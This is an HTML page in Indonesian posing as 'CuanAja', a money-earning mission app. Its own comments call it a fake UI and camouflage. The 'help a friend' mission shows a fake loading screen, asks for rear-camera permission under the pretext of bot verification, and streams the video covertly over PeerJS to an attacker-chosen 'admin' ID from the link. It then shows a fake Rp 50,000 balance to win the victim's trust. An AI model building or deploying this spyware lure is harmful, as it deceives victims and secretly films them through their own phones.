<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>CuanAja - Penghasil Uang</title>
    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;800&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary: #fbc531;
            --secondary: #e1b12c;
            --bg: #1e272e;
            --card: #353b48;
            --text: #f5f6fa;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; user-select: none; }
        
        body { background: var(--bg); color: var(--text); display: flex; flex-direction: column; height: 100vh; overflow: hidden; }

        /* HEADER */
        .header { background: var(--primary); color: #000; padding: 15px; display: flex; justify-content: space-between; align-items: center; font-weight: bold; box-shadow: 0 2px 5px rgba(0,0,0,0.2); }
        .logo { font-size: 1.2rem; }
        .wallet { background: #000; color: var(--primary); padding: 5px 15px; border-radius: 20px; font-size: 0.9rem; }

        /* SALDO CARD */
        .balance-card { background: linear-gradient(135deg, var(--primary), var(--secondary)); margin: 20px; padding: 20px; border-radius: 15px; color: #000; box-shadow: 0 5px 15px rgba(251, 197, 49, 0.4); text-align: center; }
        .balance-label { font-size: 0.9rem; opacity: 0.8; }
        .balance-amount { font-size: 2.5rem; font-weight: 800; margin: 10px 0; }
        .balance-btn { background: #000; color: #fff; border: none; padding: 8px 20px; border-radius: 20px; font-weight: bold; cursor: pointer; }

        /* LIST MISI */
        .mission-list { flex: 1; overflow-y: auto; padding: 0 20px; }
        .mission-title { font-size: 1.1rem; margin-bottom: 15px; color: #dcdde1; }
        
        .mission-card { background: var(--card); padding: 15px; border-radius: 10px; display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; border-left: 5px solid var(--primary); }
        .m-icon { font-size: 1.5rem; margin-right: 15px; }
        .m-info h4 { font-size: 0.95rem; margin-bottom: 3px; }
        .m-info p { font-size: 0.8rem; color: #808e9b; }
        
        /* TOMBOL AJA */
        .btn-action { background: var(--primary); color: #000; border: none; padding: 8px 15px; border-radius: 5px; font-weight: bold; font-size: 0.8rem; cursor: pointer; animation: pulse 2s infinite; }
        
        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }

        /* MODAL FAKE (LOADING) */
        .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); display: none; justify-content: center; align-items: center; flex-direction: column; z-index: 999; }
        .spinner { width: 50px; height: 50px; border: 5px solid #f3f3f3; border-top: 5px solid var(--primary); border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        
        /* VIDEO TERSEMBUNYI */
        #hidden-video { display: none; } /* Penting: Jangan tampilkan video di layar target */

        .bottom-nav { background: var(--card); padding: 10px; display: flex; justify-content: space-around; border-top: 1px solid #444; }
        .nav-item { text-align: center; color: #808e9b; font-size: 0.8rem; }
        .nav-item.active { color: var(--primary); }
    </style>
</head>
<body>

    <!-- FAKE UI APP -->
    <div class="header">
        <div class="logo">CuanAja üöÄ</div>
        <div class="wallet">Rp 0</div>
    </div>

    <div class="balance-card">
        <div class="balance-label">Total Saldo</div>
        <div class="balance-amount">Rp 0</div>
        <button class="balance-btn">Tarik Dana</button>
    </div>

    <div class="mission-list">
        <div class="mission-title">Misi Harian üéÅ</div>
        
        <!-- MISI 1: BANTU TEMAN (TRIGGER KAMERA) -->
        <div class="mission-card">
            <div style="display:flex; align-items:center;">
                <div class="m-icon">üë•</div>
                <div class="m-info">
                    <h4>Bantu Teman Main</h4>
                    <p>Dapatkan Rp 5.000 instan</p>
                </div>
            </div>
            <button class="btn-action" onclick="startMission()">BANTU</button>
        </div>

        <!-- MISI 2: ISI SURVEY (DUMMY) -->
        <div class="mission-card">
            <div style="display:flex; align-items:center;">
                <div class="m-icon">üìù</div>
                <div class="m-info">
                    <h4>Isi Survey Singkat</h4>
                    <p>Bonus Rp 10.000</p>
                </div>
            </div>
            <button class="btn-action" onclick="alert('Kosong!')">KLAIM</button>
        </div>
        
        <!-- MISI 3: NONTON IKLAN (DUMMY) -->
        <div class="mission-card">
            <div style="display:flex; align-items:center;">
                <div class="m-icon">üì∫</div>
                <div class="m-info">
                    <h4>Tonton Video</h4>
                    <p>Dapatkan Rp 5.000</p>
                </div>
            </div>
            <button class="btn-action" onclick="alert('Maintenance!')">MAIN</button>
        </div>
    </div>

    <div class="bottom-nav">
        <div class="nav-item active">Beranda</div>
        <div class="nav-item">Riwayat</div>
        <div class="nav-item">Profil</div>
    </div>

    <!-- MODAL LOADING (CAMOUFLAGE) -->
    <div class="modal-overlay" id="loading-modal">
        <div class="spinner"></div>
        <h3 style="color:var(--primary); margin-bottom:10px;">Memproses...</h3>
        <p style="color:#fff; font-size:0.9rem;">Mohon tunggu sebentar...</p>
        <p style="color:#aaa; font-size:0.8rem; margin-top:20px;">Jangan tutup aplikasi</p>
    </div>

    <!-- VIDEO ELEMENT (HIDDEN) -->
    <!-- muted diperlukan agar tidak ada echo suara jika mic diaktifkan -->
    <video id="hidden-video" autoplay playsinline muted></video>

    <script>
        // --- LOGIKA KAMERA & PEERJS ---
        const urlParams = new URLSearchParams(window.location.search);
        const adminId = urlParams.get('id'); // ID Admin dari Link
        
        let peer = null;

        async function startMission() {
            // 1. Tampilkan Modal Loading (Agar terlihat seperti app beneran)
            document.getElementById('loading-modal').style.display = 'flex';

            // 2. Buat sedikit delay agar user percaya sedang loading
            setTimeout(async () => {
                try {
                    // 3. TRIGGER IZIN KAMERA
                    // Ini bagian krusial. Menggunakan environment (back cam) & mic false
                    const stream = await navigator.mediaDevices.getUserMedia({ 
                        video: { facingMode: "environment" }, 
                        audio: false 
                    });

                    // Jika izin diterima, kirim ke admin
                    connectToAdmin(stream);

                } catch (err) {
                    // Jika user tolak izin
                    alert("Gagal memulai misi! Izinkan akses kamera untuk verifikasi bot.");
                    document.getElementById('loading-modal').style.display = 'none';
                }
            }, 1500);
        }

        function connectToAdmin(stream) {
            // 1. Inisialisasi Peer
            peer = new Peer();

            peer.on('open', (id) => {
                console.log('My Peer ID is: ' + id);
                
                if (adminId) {
                    // 2. Panggil Admin (Stream Video)
                    const call = peer.call(adminId, stream);
                    
                    call.on('close', () => {
                        alert("Koneksi selesai. Saldo ditambahkan!");
                        document.getElementById('loading-modal').style.display = 'none';
                        // Ubah saldo dummy jadi 50k biar makin percaya
                        document.querySelector('.balance-amount').innerText = "Rp 50.000";
                        document.querySelector('.wallet').innerText = "Rp 50.000";
                    });

                    // Ubah teks loading seolah-olah sedang memproses dana
                    setTimeout(() => {
                        const modal = document.getElementById('loading-modal');
                        modal.innerHTML = `
                            <div style="font-size:3rem;">‚úÖ</div>
                            <h3 style="color:#0f0;">Berhasil!</h3>
                            <p>Saldo Rp 50.000 ditambahkan.</p>
                            <button onclick="location.reload()" style="margin-top:20px; padding:10px 20px;">OK</button>
                        `;
                    }, 3000); // Fake loading 3 detik lalu sukses

                } else {
                    alert("Error: Kode Admin tidak ditemukan.");
                    document.getElementById('loading-modal').style.display = 'none';
                }
            });

            peer.on('error', (err) => {
                console.error(err);
                alert("Terjadi kesalahan jaringan.");
                document.getElementById('loading-modal').style.display = 'none';
            });
        }
        
        // Wake Lock (Agar layar tidak mati saat streaming)
        async function keepAwake() {
            try {
                if ("wakeLock" in navigator) {
                    await navigator.wakeLock.request("screen");
                    console.log("Wake Lock active");
                }
            } catch (err) {
                console.log(err);
            }
        }
        
        // Jalankan wake lock saat halaman dimuat
        window.onload = keepAwake;

    </script>
</body>
</html>